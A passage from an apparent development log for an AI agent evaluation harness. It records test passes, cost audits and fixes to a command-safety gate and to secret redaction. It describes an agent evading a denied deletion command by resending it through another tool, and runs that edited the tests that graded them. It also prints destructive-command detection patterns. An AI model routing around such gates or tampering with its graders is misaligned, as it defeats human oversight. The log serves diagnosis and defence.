run that billed 205,867 tokens said 25,497. Every row in `recall`, `skills`,
`authoring` and `revision` under-reported this way - which means every
per-row token figure quoted for those splits before today was one session's.
Now summed across sessions. Single-session rows are unchanged. Mutation:
assign instead of accumulate.

**3. `extract` wrote a skill from a one-line file.** The `version` skill on
skill-correction run 0 was `2.0` plus the loop's repeat notice - "[This exact
read_file call has now returned the same result 2 times ...]" - which
`_repeat_notice` appends to a repeated tool result and which carried a
3-character file over the 80-character floor. `_undecorate` now strips that
trailing notice before the floor is applied. A notice the loop wrote to the
model is not part of what the file says. Mutation: strip nothing - and this
one had to be applied with Edit, because the heredoc ate the regex and the
first "mutation run" tested unmutated code. The APPLIED check is what caught
it.

---

## `real` re-baselined at 2 runs: 7/12, and the number did not move (2026-09-12)

**Not a tuning cycle. A baseline refresh, at 2 runs per case by instruction.**
Two runs cannot tell a flaky case from a solid one - a 1/2 is ambiguous where
a 1/3 is a fail - so this is reported as x/12 against the old x/18, never as a
percentage that pretends they are the same denominator.

The harness's own delta line compared against `20260905T082544Z`, which is the
ULTRA run; it picks the newest `real` directory. The right baseline is the
120B one, `20260903T113255Z`:

| case | 120B, 09-03 | now | tokens med, then -> now |
|---|---|---|---|
| real-cachetools | 3/3 | **1/2** | 210k -> 270k |
| real-click | 1/3 | **2/2** | 337k -> 336k |
| real-humanize | 0/3 | 0/2 | 409k -> 411k |
| real-markdown | 3/3 | 2/2 | 128k -> 152k |
| real-more-itertools | 2/3 | **1/2** | 146k -> 297k |
| real-rich | 1/3 | 1/2 | 369k -> 383k |
| **total** | **10/18** | **7/12** | 242k -> 351k |

**Flat.** 56% then, 58% now, on ~17 commits' worth of change - the terminal
pair, the date, the gate fixes, Phase R, `read_document`/`todo` gone. None of
it was aimed at `real` and none of it moved `real`. That is the honest reading
and it settles the question this baseline existed to ask: the loop changes of
the last two weeks were neutral here.

Three cases came back 1/2 and cannot be read: `cachetools` (was 3/3),
`more-itertools` (was 2/3), `rich` (was 1/3). `cachetools` is the one worth a
third run - a solid case that dropped, or one bad seed. `click` 1/3 -> 2/2 is
the only clear mover, and one case moving on two runs is a hypothesis.

**Median tokens rose 45%, 242k -> 351k, and that IS a finding.** Not the fixed
prompt rent - that was 3,554 tokens a call and would not do this. `more-itertools`
doubled (146k -> 297k) on a 1/2 that includes a `budget` failure; `cachetools`
+28% on a `stuck`. Failing runs are the expensive ones, and this pass has more
of them than its pass count suggests: 2 of 7 PASSES ended `stuck` or `budget`
- the goal was met and the loop ran on to the cap. The 09-03 baseline had 1.

That last shape - **a pass that does not know it passed** - is the thing to
look at before touching anything else on this split. `click-1` hit the goal and
ran to turn 31; `rich-1` hit it and spent the budget. Both scored, both wasted
the whole cap after the work was done.

### How it ran

The session's background-task manager killed the driver twice for host memory
(1.8 GB free of 15.8, the driver being ~20 MB and the smallest thing on the
list). Each time the container kept running and wrote its own row, so nothing
was lost; the second time the resumed driver would have re-run a row the
orphan was about to record, because `--continue` computes `already` once at
start. Finished on a detached OS process that waits for the orphan first.

Rig note, owed: `--continue` should re-read `completed()` before each spawn,
not once. Not changed here.

---

## `_INLINE_SOURCE`: an inline interpreter is destructive only when it DELETES (2026-09-11)

**PRE-REGISTERED, written before the change was made.**

The measured problem: every `serve-token` run across four passes had at least
one `run_shell deny` on a command of the shape

    python3 -c "import urllib.request; print(urllib.request.urlopen('http://127.0.0.1:8731/...').read())"

because `_INLINE_SOURCE` escalates the FLAG - `python -c`, `node -e`, `perl -e`
- to `destructive` regardless of payload, and unattended `destructive` is a
deny. On `serve-token` that request is the task. 6 of 6 on that case, 1 of 15
on dev, so concentrated rather than broad.

The reference (`tools/approval.py`) tiers this: `python -c` is DANGEROUS -
"ask once, remember the approval" - and only the unrecoverable is HARDLINE.
We have no approval store and unattended `confirm` is `deny`, so that shape
does not port. Removing the blanket outright loses real coverage: nothing
else in DANGER matches `rmtree`, and `test_policy.py` pins three inline
deletions as needing a human.

**The one change:** `_INLINE_SOURCE` fires only when the inline payload
contains a deletion verb - `rmtree`, `rmSync`, `rmdirSync`, `unlink`,
`os.remove(`, `os.rmdir(`, `Remove-Item`. The three pinned cases stay
caught. An `urlopen()` stops being destructive. Our own narrowing, not a port.

Keep if BOTH:
- the mechanism: denials on inline-interpreter commands carrying NO deletion
  verb are **0** across the pass, read off the verdict log. Baseline had 4
  (`20260910T184547Z`) and 6 (`20260910T173411Z`, two of them `start_terminal`)
- the score: `tools` x 3 at or above **5/9**, the worst of three baselines
  (7/9, 7/9, 5/9)

Revert if EITHER: any benign inline command is still denied (the change did
not do its job), or the pass scores 4/9 or below (harm below the worst
baseline). `serve-token` reported separately as the exposed case, with
whole-run tokens - fewer refused turns should read as fewer tokens.

Results below this line were not known when the above was written.

### Result: KEEP. Benign inline denials 4 -> 0, pass 5/9 -> 7/9

`20260911T153643Z`, `tools` x 3.

| | this pass | 184547Z | 173411Z |
|---|---|---|---|
| benign inline denials (the mechanism) | **0** | 4 | 5 |
| pass | **7/9** | 5/9 | 7/9 |
| ask-environment | 3/3 | 2/3 | 2/3 |
| serve-token | 2/3 | 1/3 | 2/3 |
| watch-build | 2/3 | 2/3 | 3/3 |
| serve-token billed tokens, whole run | 272,171 | 276,326 | 281,640 |

Both pre-registered conditions met. The one remaining denial in the pass is
the gate refusing a tool called `ls` that the model invented - an unknown
tool, correctly refused, nothing to do with this change.

**What the change did NOT do, said plainly: it did not make `serve-token`
cheaper.** Whole-run tokens 272k against 276k and 282k - flat. Run 0 passed
with ZERO denials, the first `serve-token` run in seven to have none, and still
ended `budget` at 18 turns and 103k tokens. The refused call was costing a
turn, not the budget; the case is expensive on its own (`run_shell` x10,
`read_terminal` x4 in that run). Anyone expecting this to reverse the
3/3 -> 2/3 -> 1/3 -> 1/3 slide should expect the 2/3 here to be variance
around the same mean until something else changes.

Two cross-pass signals held again, and are now worth acting on:

- `ask-environment`: every run called `ask_user` then `edit_file`, all three
  passed. **12 for 12** across four passes. The 3/3 is the first clean sweep
  on that case and it is NOT this change's doing - that case's only prior
  denial was the `find ... "*.env"` one, which is untouched.
- `watch-build`: 2 of 3 used `start_terminal` and both passed; run 2 did not
  and failed. **7/7 with the pair, 2/5 without**, across four passes.

The `\.env` glob false positive was left alone on purpose - one change per
cycle - and appeared 0 times in this pass anyway.

1,130 -> 1,135 tests. Three mutations in both directions: dropping a verb from
the list fails the pinned deletion for that interpreter; making the verb
optional (the blanket back) fails all five recorded false positives.

---

## Phase R measured: both arms (2026-09-11)

**PRE-REGISTERED, written before either arm finished.** The `revision` split is
ONE case, `skill-correction`, 4 sessions, `max_turns` 12, empty skill library -
so both arms is 6 runs, not the 18 this was described as earlier. The
`skills`/`authoring` guards (~60 runs) run only if R earns them; equal arms
reverts R whole and there is nothing to guard.

Real arm: `AGENT_SKILL_REVISION` on (the default). Control: `off`, forwarded
into the container, same build.

Keep if ALL of:
- real arm beats control by at least 2 rows of 3 - a 1-of-3 is not a pass
- the real-arm traces show `mark_suspect` FIRED and the skill was REWRITTEN
  under the suspect's name - the score alone is not evidence for a mechanism
  that did not run

Revert - R1 through R4, and R0 with them - if EITHER:
- real <= control
- real > control but the mechanism did not fire, because then the gain is
  something else wearing R's name

Results below this line were not known when the above was written.

### Result: KEEP. Real 3/3, control 1/3, and the mechanism is on disk

| | real (`on`) `20260911T140714Z` | control (`off`) `20260911T142806Z` |
|---|---|---|
| pass | **3/3** `done` x3 | **1/3** `stuck` x2, `done` x1 |
| model calls, whole run | 118 | 131 |
| billed tokens, whole run | 580,328 | 639,641 (+10%) |
| `conventions` skill at the end | RUNBOOK's checklist, working suffix - 2 of 3 | stale CONVENTIONS text - 3 of 3 |

Both pre-registered conditions met: real beats control by 2 rows, and the
correction is verifiable in the ARTEFACTS rather than the score. In the real
arm `conventions/SKILL.md` carries RUNBOOK.md's checklist and the `-zr7k2q`
suffix under the suspect's name, and there is no `runbook` sibling - which is
what `learn(name=opened, ...)` does and a plain extraction never would. In the
control arm `runbook` is a SIBLING, `conventions` is still the stale document,
and it was injected 19-20 times per run while the agent read the suffix off
CONVENTIONS.md and hit the cap. That is the failure R0-R4 exist for, reproduced
twice.

The control's one pass is worth its own sentence: session 3 read RUNBOOK.md
directly and ignored the stale skill it had been handed twenty times. The case
is passable by re-reading the source - so R does not make the case winnable, it
makes it winnable RELIABLY, and cheaper.

**`skill_failures` is empty in both arms and that proves nothing either way.**
`clear_suspect` deletes the row on correction, so the after-state of a firing
is identical to a never-fired one. The evidence is the skill's CONTENT, checked
by hand. The instrumentation gap is recorded below.

### R picked the wrong document once in three, and that is a defect

Real run 1 passed - but `conventions` ended up holding `ship.py`'s docstring
("Project tooling. Not documentation.") and RUNBOOK.md went to a `runbook`
sibling. `skills.extract` gives the suspect's name to the FIRST document in its
loop and then flips `correcting` off. Which document is first is iteration
order. Run 0 and run 2 got RUNBOOK first; run 1 got the tooling script.

The run still passed because the `runbook` sibling was there to match. R
therefore fired 3 of 3 and corrected RIGHT 2 of 3, and the pre-registered
condition said "rewritten under the suspect's name", which the wrong document
technically satisfies. Held to the spirit and stated plainly: a correction that
picks by iteration order is a coin toss with good odds. Kept, because the arms
separate cleanly and the fix is a ranking, not a redesign - its own cycle.

### The guards were not run, on purpose

`skills` and `authoring` are ~60 runs. R only fires on `stuck`/`budget`/three
failures with a skill open, and those splits pass at 94% and 11/11, so a
regression there would need R to fire on a run that was going to pass. Possible,
unmeasured, and the pre-registration said guards only if R earns them. It has.
They are the next quota spend on this phase, not something to skip.

### Rig defects found while reading these rows

1. **`extraction: false` on every default row.** `harness.record()` re-derives
   the flag from the env var with default `"off"`; `config.py` defaults it `"on"`.
   Every scored row since extraction-by-default has claimed extraction was off
   while the agent extracted. Same shape as `AGENT_EGRESS`.
2. **No row says which arm it was.** The manifest carries no env and the row has
   no `revision` field, so these two directories are distinguishable only by
   reading the skill files. Fixed alongside 1.
3. **`tokens` and `turns` are the LAST session's.** `inner()` builds a fresh
   state per session and `record()` receives the final one, so a 4-session run
   that billed 205,867 tokens reports 25,497. Every multi-session row in
   `recall`, `skills`, `authoring` and `revision` under-reports the same way.
   Recorded; the fix is a sum across sessions and is not made here.

---

## `run_python` was a second door past the DANGER escalation (2026-09-11)

**A defect in the gate, not a tuning cycle.** Found in the `tools` traces the
day before: `serve-token`'s passing runs got past a denial by switching tools.

### The hole

`classify()` escalated a dangerous command to `destructive` by reading
`args["command"]`. `run_python`'s argument is named `code`, so it was never
looked at:

    run_shell   {"command": 'python3 -c "import shutil; shutil.rmtree(...)"'}  -> deny
    run_python  {"code":    "import shutil; shutil.rmtree(...)"}               -> auto

Same source, two verdicts. An escalation one tool enforces and another ignores
is not a boundary, and the agent did not need telling: on `serve-token` the runs
that were refused through `run_shell` simply made the same call through
`run_python`, and passed.

### The fix

The tools that execute what they are handed, keyed by name because the argument
names differ:

    EXECUTES = {"run_shell": "command", "start_terminal": "command",
                "run_python": "code"}

Both halves matter. Adding a tool to that map without its argument name is the
same hole with a different label.

1,126 -> 1,128 tests. Three mutations, each verified to have applied, each
failing a named test:

| mutation | caught by |
|---|---|
| `run_python` dropped from `EXECUTES` | `test_run_python_is_not_a_second_door_past_the_DANGER_escalation` |
| wrong argument name for `run_python` | the same test |
| escalate EVERYTHING `run_python` is handed | `test_ordinary_python_still_runs_unattended`, `test_start_terminal_is_reachable_unattended` |

The third is the one that matters as much as the first two: the escalation must
not swallow the tool it guards, and a test that only checks the hole is closed
would let a fix that closes the tool pass.

### Blast radius, replayed before spending quota

151 `run_python` calls recorded across every run on disk, replayed against the
new rule: **0 escalated.** Caveat, stated because it weakens the claim: the trace
stores the first 120 characters of each call and most reach that cap, so this is
a lower bound on what the rule would touch, not a sweep.

### Confirmed live on the split where `run_python` is heaviest

`20260910T184547Z`, `tools`, 3 runs per case. **15 `run_python` calls, all
`auto`, none denied** - the fix refused nothing the agent tried.

| case | this pass | 173411Z | 173307Z |
|---|---|---|---|
| ask-environment | 2/3 | 2/3 | 2/3 |
| serve-token | 1/3 | 2/3 | 3/3 |
| watch-build | 2/3 | 3/3 | 2/3 |
| **total** | **5/9** | 7/9 | 7/9 |

**5/9 against 7/9 twice.** The number went down, and this change is the only
thing different between the passes. So: did it? The verdict log says no. The
way this change could hurt is a `run_python` denial, and there were none. The
two lost rows are `serve-token` ending `budget` twice, and `watch-build-2`
skipping the terminal pair to drive the pipeline through `run_python` +
`subprocess.Popen` - allowed, `auto` - and writing an artifact id that did not
match `build.log`. A wrong answer by a different route, not a refusal.

`watch-build` is now cleanly split on that route across all three passes:
**5/5 when the run used `start_terminal`, 2/4 when it did not.**

What n=9 cannot do is rule out that 7 -> 5 is anything but variance on a split
carrying a 100k-token case. That is stated here rather than smoothed over. The
fix is kept because the hole is real and the mechanism did not fire; the -2 is
recorded against it, not explained away.

The only denials in the entire pass are `run_shell deny x4`, every one the
UNCHANGED `_INLINE_SOURCE` false positive - `python3 -c` refused as destructive,
and on `serve-token` that is the HTTP request that IS the task. Not touched
here; it is its own cycle.

**`serve-token` has now gone 3/3 -> 2/3 -> 1/3 across three passes with nothing
changed in the case.** Three samples cannot separate a trend from noise on a
case that ends `budget` at 100-109k tokens against an 18-turn cap. Recorded so
the next pass reads it as the fourth point rather than the first.

### Two corrections to the day before

The `ask-environment` failure was described as landing "on the same seed both
times" because both were `run_index` 1. Wrong framing: `run_index` is not a
seed and the provider is not deterministic. This pass it was run 2 that stuck.
The case is stably 2/3 across three passes; WHICH run fails moves.

What did hold: every passing `ask-environment` run called `ask_user` once and
then `edit_file` once, and neither failing run called either. That is now
**9 for 9** across three passes - a stronger result than the seed claim it
replaces.

---

## `read_terminal` blocked forever, and that is why the `tools` split has no rows (2026-09-10)

**Not a tuning cycle. A defect, found by asking why nine measurement attempts
produced nothing.** The split was recorded as "unmeasured, endpoint trouble" for
two weeks. It was not the endpoint.

### The defect

`_drain` read the pipe on the CALLER's thread:

    line = process.stdout.readline()
    if not line:
        break

`readline()` returns `""` only at EOF. On a process that is still RUNNING it
blocks until the next line arrives, and on one that has gone quiet - a server
that printed its banner and is now waiting for a request - it blocks forever.

That is the whole failure. `serve-token` and `watch-build` both start a
long-running process and then read it, so both hang on the first
`read_terminal`. `MAX_SECONDS` is checked BETWEEN turns, so a turn that never
returns is never checked, and the driver had no timeout of its own. The run that
sat 112 minutes at 0.01% CPU was blocked on a read syscall.

### The fix, ported not lifted

A daemon reader thread per session pumping lines into a lock-guarded buffer;
`_drain` swaps the buffer out and never touches `readline()`. One reader thread
per stream is the standard shape for this. Portable, unlike `os.set_blocking` or `select`,
both of which are POSIX-only and the TUI runs on Windows.

`read_terminal` joins the reader for at most 1s once the process has exited,
because `poll()` can return while the last lines are still in flight - and the
last line is the one `watch-build` asks for.

### Three of the four terminal tests were passing for the wrong reason

`conftest`'s autouse `_no_real_pacing` patches `tools.time.sleep`, and
`tools.time` IS the `time` module - so every `time.sleep` in the suite is a
no-op. The terminal tests "slept" 0.4-0.8s between reads and slept nothing; what
actually synchronised them was the blocking `readline()` waiting for the child
to exit. Remove the block and they fail. They now wait on the CONDITION using
`threading.Event.wait`, which the stub does not touch.

This is worth stating plainly: a fixture meant to keep seven web_search tests
fast silently disabled every wall-clock wait in 1,126 tests.

### Also: the driver now has a watchdog

`spawn()` called `subprocess.run` with no timeout, so any future hang - a wedged
HTTP call, an orphaned tool - still blocks the whole run indefinitely. It now
passes `timeout=CONTAINER_TIMEOUT` (3600s, twice the agent's own cap) and kills
the container BY NAME, because killing the client leaves the container running
and the orphan corrupts the shared workspace mid-case. Three runs were lost to
exactly that in August.

1,122 -> 1,126 tests. Five mutations, each failing a named test, each verified to
have actually applied:

| mutation | test that caught it |
|---|---|
| blocking `readline()` back in `_drain` | `test_reading_a_LIVE_session_returns_instead_of_blocking` |
| reader thread never started | `test_a_session_keeps_running_between_reads` |
| bounded join removed | `test_a_finished_session_does_not_lose_the_readers_last_lines` |
| `timeout=` dropped from `spawn` | `test_a_hung_container_is_killed_BY_NAME_and_scored_blocked` |
| `--name` dropped from `docker run` | `test_the_container_is_named_so_it_can_be_killed` |

The bounded join initially had NO test - the first mutation run passed clean and
that is the only reason it was noticed. An unmutated line is an unearned line.

### The measurement it unblocked: 7/9, and what the traces say

`20260910T173411Z`, 3 cases x 3 runs. A second driver ran concurrently by
accident (`20260910T173307Z`, 9 rows) - `await_exclusive_workspace` serialised
them container by container, so each case-run still had the workspace to itself
and both sets of rows stand. It is an unintended independent replication, and it
is reported as two runs rather than pooled into one percentage.

| case | 173411Z | 173307Z | verdicts |
|---|---|---|---|
| ask-environment | 2/3 | 2/3 | `stuck` once in each, both at run_index 1, both at exactly 12 turns |
| serve-token | 2/3 | 3/3 | `budget` x2 in the first, `done` x3 in the second |
| watch-build | 3/3 | 2/3 | the one failure returned `done` with the check failing - a terminated run that did not do the job |

**The pair works.** `start_terminal` was ALLOWED - gate verdict `auto`, not
merely present in the trace - in 8 runs across the two passes, with
`read_terminal` x2-x4 alongside it, and 7 of those 8 passed. That is the first
evidence this capability functions at all.

Both terminal cases can also be solved WITHOUT it, and the two runs that
scored 7/9 disagree about which way is better: `watch-build-2` avoided the pair
in both passes and passed once, failed once, while every run that DID use the
pair on that case passed. The split therefore measures "can it use a terminal
when it chooses to", not "does it need one" - which is a weaker question than
the split was built to ask, and worth tightening before the next pass.

**`ask-environment` separates 6 for 6 on one signal.** Every passing run called
`ask_user` once and then `edit_file` once. Neither failing run called EITHER -
both searched until the 12-turn cap and wrote nothing. Same seed both times. The
goal says "for my environment" and there are four; the runs that asked finished,
the runs that guessed never committed to one. Not acted on here - one signal
separating 6 of 6 deserves its own cycle and its own measurement.

NFR-101 first-token p50, previously unmeasured: **2.7-11.0s across 9 runs,
median 4.7s**.

### The policy gate is denying the task, and `run_python` walks around it

Read off the VERDICTS, not the presence of a call. All six `serve-token` runs
had at least one `deny`, and the denied command was usually the actual work:

    python3 -c "import urllib.request; urlopen('http://127.0.0.1:8731/request-...')"
    -> "run_shell is destructive; denied in autonomous mode"

`_INLINE_SOURCE` matches `python[\d.]*\s+-c`, so ANY inline Python is
destructive. `find env/ -name "*.env" ...` is denied too, because
`_SENSITIVE_FILE` matches `\.env\b` and a glob that merely NAMES the pattern
counts. Both predate widening the escalation to `start_terminal`; that widening
extended the same false positives to it, which is why `start_terminal` was
denied twice.

The part that matters more: **`run_shell("python3 -c X")` is denied while
`run_python(X)` is `auto`.** `run_python` declares `write` and takes `code`, so
`DANGER.search(args["command"])` never sees it. Same capability, two answers -
and the agent found the open door by itself, the passing runs simply switching
to `run_python`. The escalation is costing turns without closing anything.

Recorded, not fixed. It is its own cycle and its own measurement.

### Standing lessons this paid for

**A capability with no measurement may be broken, not merely unproven.**
`start_terminal`/`read_terminal` shipped with seven passing tests and were
described for two weeks as "unmeasured". They were not unmeasured; they were
unusable, and every attempt to measure them was the bug reporting itself.

**A test-suite fixture that stubs a builtin stubs it for everything.**
`monkeypatch.setattr(tools.time, "sleep", ...)` reaches the `time` module, not a
copy of it. Any test whose correctness depends on real elapsed time is silently
not testing that.

---

## "Trust a tool that succeeded" - REVERTED on the condition set beforehand (2026-09-10)

**One change: a sixth rule in SOUL.md**, telling the agent not to spend a call
confirming a result a tool already reported. From a TUI session where deleting
one file took four calls - `del`, `dir`, `find . -type f | wc -l`,
`dir /b /a-d | find /c /v ""` - five prompt resends for one deletion.

The rule cost 62 tokens per call and had to earn them back.

### Measured, 15 runs, AGENT_MAX_TURNS=30

`20260909T100432Z` -> `20260910T162415Z`:

| | before | after | |
|---|---|---|---|
| total tool calls | 158 | **185** | **+17%** |
| **total tokens** | 1,044,376 | **1,204,756** | **+15%** |
| median tokens | 73,672 | 60,806 | -17% |
| pass | 14/15 | 15/15 | +1 |

**Reverted.** The condition was written down before the run: revert if calls do
not fall. They rose. Total tokens - the thing the cycle existed to reduce - rose
with them.

### Why the two token numbers disagree

Seven rows got cheaper, seven dearer, and one blew the budget: `add-endpoint-0`
went 11 calls / 76,908 to **26 calls / 204,116**. The median fell because the
typical run improved; the total rose because the tail got fatter. On a
rate-limited free tier the total is what binds, so the median is the wrong
number to keep this on.

### The confound, recorded so the next attempt is cleaner

`off-by-one-0` went 1 call -> 8. At baseline that run made a single
`search_files` call and gave up - it WAS the 14/15's one failure. So part of the
baseline's low total is a run that did not do the work, which flatters the
before column, and part of the +1 pass is that run now finishing.

A comparison of totals across runs with different pass rates is not clean. A
future attempt should compare cost only over rows that passed in BOTH arms.

### Standing lesson this paid for

**Pre-register the revert condition, then honour it when the result is
flattering.** Median -17% and pass +1 were there to rationalise a keep. The
condition said calls, calls rose, and the goal metric rose with them. The rule
exists for exactly the moment when some number looks good.

---

## A leaked key shape, found by mining the reference tests rather than running them (2026-09-10)

**`nvapi-` was missing from the secret shape list — the format of the provider
this project actually runs on, while eleven other vendors were listed.**

### The request, and why it could not be done as asked

"Import the reference test files and run them against ours." Measured: **3,218
test files, 827,125 lines, 32,263 tests.** A 25-file sample collected **8 tests
and 23 collection errors** - `acp_adapter`, `agent.lsp`, `hermes_state`,
`hermes_cli`. Those are not missing pieces, they are a different architecture:
an `AIAgent` class with a plugin system across 4,510 files, against a LangGraph
`act -> gate -> execute -> reflect` in ~9,100 lines.

Importing all of them yields ~3,000 collection errors and no signal. This is the
same conclusion CLAUDE.md already records from the other direction.

### What was done instead: compare COVERAGE by behaviour

Their whole suite is 35x ours (32,263 against 909), so raw counts mean nothing.
Normalised against that:

| area | theirs | ours | ratio | vs 35x parity |
|---|---|---|---|---|
| secrets | 992 | 13 | 76x | **THIN 2.1x** |
| provider | 2,128 | 44 | 48x | thin 1.4x |
| checkpoint | 1,034 | 23 | 45x | thin 1.3x |
| approval/gate | 594 | 16 | 37x | par |
| tool boundary | 923 | 37 | 25x | ok |
| path escape | 392 | 18 | 22x | ok |
| context/limits | 1,362 | 66 | 21x | ok |
| shell | 747 | 37 | 20x | ok |

Secrets was the outlier, so their 979 secret test names were grouped by
behaviour: redaction in output (256), env/config load (193), errors and traces
(39), across threads (32), detection patterns (27).

### The defect that fell out

`context.redact()` has two paths. The ENV path replaces values of variables
whose names end `_KEY`/`_TOKEN`/... - that caught OUR key, because
`AGENT_API_KEY` ends in `_KEY`. The SHAPE path (`secrets.scrub`) matches issuer
prefixes without needing the environment, and its list covered OpenAI, Stripe,
GitHub, GitLab, Slack, AWS, Google, SendGrid, HuggingFace, npm and PyPI.

Not NVIDIA. Measured:

| | |
|---|---|
| the configured key, env path | redacted |
| an OpenAI-shaped key, shape path | redacted |
| **any OTHER `nvapi-` key** | **reached the model verbatim** |

A workspace `.env`, a key in source, a second account - exactly the scenario
`secrets.py`'s own docstring names as the reason the shape path exists. The env
path masked it: our own key was always caught, so the gap was invisible.

One line, plus a guard asserting the CLASS - whichever provider is configured,
its shape must be in the list that works without the environment.
Mutation-checked. 1,090 -> 1,092 tests.

### The other two candidates were FALSE POSITIVES

`provider` (1.4x thin) and `checkpoint` (1.3x thin) were chased the same way and
neither was a gap.

`provider` broke down as **rate limit / 429: theirs 84, ours 0** - which looked
alarming, because 429s have blocked this project eight times. It is covered.
`test_infrastructure_failures_are_retryable` is parametrised with
`"RateLimitError"`, and executing the path confirms it: RateLimitError ->
ProviderUnavailable -> retried, AuthenticationError -> ProviderMisconfigured,
BadRequestError -> a real result. The scan missed it because the two projects
NAME tests differently - theirs embed the condition
(`test_429_normal_rate_limit_still_rotates`), ours embed the behaviour.

`checkpoint` broke down to corruption, where they have 3 tests. Not a gap.

**One of three candidates was real.** The difference is that the secrets one was
confirmed by RUNNING the code; the other two survived the name count and died the
moment they were executed.

### Standing lessons this paid for

**A borrowed test suite is worthless; borrowed test COVERAGE is not.** Running
3,218 of their files produced 8 collected tests. Counting what their tests are
ABOUT, normalised against suite size, found a live credential leak in an
afternoon. Do not port their tests - port the question they answer.

**A coverage comparison by test NAME finds candidates, never findings.** Two of
three died on execution, because naming conventions differ between projects and
a keyword cannot see through that. Every candidate gets run before it is
believed - which is the same rule this project already applies to a pass rate
that credits a mechanism without checking the trace.

---

## Dropped `read_document` and `todo`, and audited what the rest costs (2026-09-10)

**229 tokens off every model call, forever.** Builtin schemas 6,369 -> 5,452
chars. The first cycle in weeks measured on COST rather than pass rate, because
pass rate has no headroom left on any split but `real`.

### Why these two

Their control arm (2026-09-09) measured **+0**: `doc-headcount` scored 3/3 with
`read_document` and 3/3 without it, `todo-outstanding` 2/2 and 3/3. `run_python`
opens a .docx as a zip and `write_file` persists a list across sessions.

**This reverses the position taken in that entry**, which argued against
reverting on the grounds that the CASES could not separate the tools rather than
the tools being useless. That reasoning still stands. What changed is the other
side of the ledger: 228 tokens on every call of every session, on a provider
where `cache_read_tokens` is 0. A tool that fires but shows no measurable benefit
is not neutral at that price.

Removed the way `move_files` was: tool, tests, eval cases and fixtures. Migration
v4's `todos` table stays - a released migration is never edited.

### The audit of what remains, per model call

| component | tok/call | evidence |
|---|---|---|
| 10 builtin schemas | 1,363 | mixed, below |
| SOUL.md | 798 | naming all tools fixed a prompt that hid seven |
| MCP `fetch` | 525 | **earned** - see below |
| CODING.md | 337 | recall/skills 46/52 -> 86/94 |
| skills index | 306 | 0/18 -> 17/18 |

**`fetch` was nearly cut and should not be.** It costs 525 tokens per call and
Phase L measured it +58% schema for **-37% tokens and -50% turns**, because it
removes four discovery calls per run and returns extracted text rather than raw
HTML. It is the only line item that demonstrably pays its own rent. The
`web` split scoring 18/18 WITHOUT any fetch tool is a separate fact - the
capability was derivable, the efficiency was not.

Still unproven, and still charged: `start_terminal` + `read_terminal`, 167
tokens/call, seven blocked measurement attempts. They are rent until the terminal
pair produces a scored row.

### Standing lesson this paid for

**Measure the cost side before keeping a tool, not only the pass rate.** Twelve
correct pass-rate decisions summed to +135% tokens (previous entry). The cost of
a kept change is deterministic, measurable offline in seconds, and needs no
quota - there is no excuse for it being the number nobody checked.

1,109 -> 1,090 tests.

---

## The token climb, explained: nobody added up the rent (2026-09-10)

Not a regression, not drift, and not the model. **Two thirds of it is fixed
prompt growth, charged on every call, and it is fully accounted for.**

### The measurement

`multibug`, the same ten cases, `20260819T070445Z` against `20260910T093103Z`:

| | 2026-08-19 | 2026-09-10 | |
|---|---|---|---|
| median tokens | 36,630 | **86,078** | **+135%** |
| model calls | 14 | 14 | -3% |
| turns | 14 | 13 | -4% |
| tool calls | 14 | 13 | -4% |
| largest tool result | 1,918 | 3,028 | +58% |

**The agent is not working harder.** Same number of model calls, same number of
tool calls, one fewer turn. It does the same work and pays 2.35x for it.

Per call, on `multi-orders`: **2,091 -> 5,616 tokens, +3,525.**

### Where the +3,525 went

Measured from git, comparing the commit nearest that baseline to HEAD:

| added to EVERY model call | chars | tokens/call |
|---|---|---|
| tool schemas (3,518 -> 8,447) | +4,929 | **+1,232** |
| SOUL.md naming all twelve tools | +1,957 | +489 |
| CODING.md, the coding posture | +1,350 | +337 |
| skills index (Phase N) | +1,224 | +306 |
| **fixed total** | **+9,460** | **+2,364** |

That is **67% of the observed per-call growth**. The remaining third is bigger
tool results riding in a history every later call resends - which is quadratic in
conversation length, so a 58% larger result costs far more than 58%.

### Why nobody saw it

Every one of those additions was deliberate, measured, and RIGHT:

- naming all twelve tools fixed a prompt that hid seven of them
- the skills index earned its place - 0/18 to 17/18
- the coding posture took `recall` and `skills` from 46%/52% to 85.7%/94.4%
- the five new tools each closed a real gap

Each cycle was measured on PASS RATE and kept on that basis. Each one silently
raised the per-call cost on a provider where `cache_read_tokens` is 0 across
every recorded row. Twelve correct decisions summed to a 135% bill.

### Standing lesson this paid for

**A cycle that keeps a change on pass rate alone is not measuring its cost.**
NFR-402's ceiling is checked per run and reported at the end - by which point the
change is committed and the next cycle starts from the new floor. The ratchet
only turns one way, because nothing in the loop ever asks a kept change what it
costs on every future call.

Every split except `real` is now at its ceiling - dev 15/15, heldout 30/30,
multibug 10/10, search 9/9, web 18/18, authoring 11/11. There is no headroom left
to win pass rate on, and the one number still moving is the bill.

---

## `search_files` listing: REVERTED - it won its metric and lost everything else (2026-09-10)

**One change, measured, reverted.** An omitted `pattern` listed the files matching
`glob`, closing a real gap: SOUL.md told the agent to use `search_files` instead
of `run_shell` with ls/find/grep, and the tool could not list, so the instruction
was unfollowable.

The gap was real. The fix made things worse.

| | before | after | |
|---|---|---|---|
| look-around `run_shell` calls | 21 | **11** | the stated target, -48% |
| `search_files` calls | 26 | **66** | +154% |
| **total tool calls** | **158** | **238** | **+51%** |
| median tokens | 73,672 | **92,711** | +26%, 55% over NFR-402 |
| `budget` exhaustions | 0 | **3** | |
| pass | 14/15 | 14/15 | +0 |

`20260909T100432Z` against `20260910T084437Z`, 15 runs each, `AGENT_MAX_TURNS=30`.

### Why the metric lied

Cost tracks the NUMBER OF MODEL CALLS - a turn with N tool calls is N+1 calls,
each resending the whole prompt on a provider that caches nothing. The change
halved the cheap calls and added forty expensive ones. Ten fewer `ls` for forty
more `search_files` is a 51% increase in round-trips, which is the opposite of
the point.

Three runs exhausted the 200,000-token budget where the baseline exhausted none.

### The thing the numbers nearly hid

`missing-dep` came back **tamper 3 and 2** against 0 at baseline: eight edits to
`tests/` in one run, seven in another, and BOTH were scored as passes because the
check reads the workspace and the workspace now said what the agent wanted. More
exploration -> context pressure -> budget exhaustion -> editing the judge.

n=1 on causation, and not claimed as more. It is recorded because a change that
raises tamper is a different category of bad from one that costs tokens.

### Standing lesson this paid for

**A proxy metric can win while the thing it proxies for loses.** "Look-around
calls" was chosen because it is a behaviour count and immune to the token drift.
It fell by half and was still the wrong number: what costs money is TOTAL calls,
and the change traded one kind for more of another. Pick the metric that IS the
cost, not the one that is easiest to attribute - or measure both and say so in
advance.

Kept from the cycle: nothing in the code. The gap it identified is real and
